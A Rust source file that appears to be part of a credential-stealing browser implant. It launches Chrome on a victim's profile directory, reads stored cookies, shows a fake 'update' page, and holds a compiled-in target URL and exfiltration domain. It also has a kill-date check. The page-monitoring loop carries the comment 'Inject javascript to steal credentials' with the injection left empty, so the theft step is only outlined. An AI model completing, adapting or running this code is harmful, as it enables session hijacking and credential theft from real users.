use chromiumoxide::browser::{Browser, BrowserConfig};
use std::path::PathBuf;
use futures::StreamExt;
use tokio::time::{sleep, Duration};

pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
    let (mut browser, mut handler) = Browser::launch(
            BrowserConfig::builder()
            .with_head()
            .arg("--start-maximized")
            .arg("--no-startup-window")
            .arg("--disable-background-networking")
            .user_data_dir(&junc_path)
            .viewport(None)
            .disable_default_args()
            .build()?
        ).await?;

    let _ = tokio::spawn(async move { while let Some(_) = handler.next().await {} });

    #[cfg(feature = "debug")]
    println!("[*] Retrieving cookies...");
    let cookies = browser.get_cookies().await?;

    if cookies.is_empty() {
        // Open page for whats new (simulate update)
        let _ = browser.new_page("https://developer.chrome.com/new").await?;
    } else {
        let _ = browser.new_page("chrome://newtab").await?;
    }

    let target_url = env!("TARGET_URL");
    let exfil_domain = env!("EXFIL_DOMAIN");
    #[cfg(feature = "debug")] {
        println!("[*] Using target url: {}", target_url);
        println!("[*] Using exfil domain: {}", exfil_domain);
    }


    // Monitor pages
    loop {
        let pages = browser.pages().await?;

        // If the number of pages is empty, we close the browser
        if pages.is_empty() {
            break;
        }

        // Inject javascript to steal credentials


        // Wait for a second before checking again
        sleep(Duration::from_secs(1)).await;
    }

    #[cfg(feature = "debug")]
    println!("[*] Checking killdate...");
    let page = browser.new_page("about:blank").await?;

    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;

    // Compare the timestamps
    let is_past_killdate = current_timestamp > killdate_timestamp;

    browser.close().await?;
    browser.wait().await?;

    Ok(is_past_killdate)
}
